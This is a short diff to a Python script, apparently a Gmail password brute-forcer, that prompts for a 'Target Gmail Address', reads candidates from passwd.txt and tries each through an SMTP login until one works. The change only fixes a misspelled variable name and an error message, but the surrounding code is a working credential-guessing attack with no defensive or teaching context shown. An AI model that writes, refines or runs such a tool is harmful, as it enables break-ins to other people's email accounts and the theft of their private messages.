@@ -34,14 +34,14 @@ smtpserver.starttls()
 user = input("Enter The Target Gmail Address => ")
 print("\n")
 
-passswfile = "passwd.txt"
+passwdfile = "passwd.txt"
 try:
-    passswfile = open(passswfile, "r")
+    passwdfile = open(passwdfile, "r")
 except Exception as e:
-    print(e)
+    print(f"Error: {e}")
     sys.exit(1)
 
-for password in passswfile:
+for password in passwdfile:
     try:
         smtpserver.login(user, password)
         print("Right password, %s" % password)
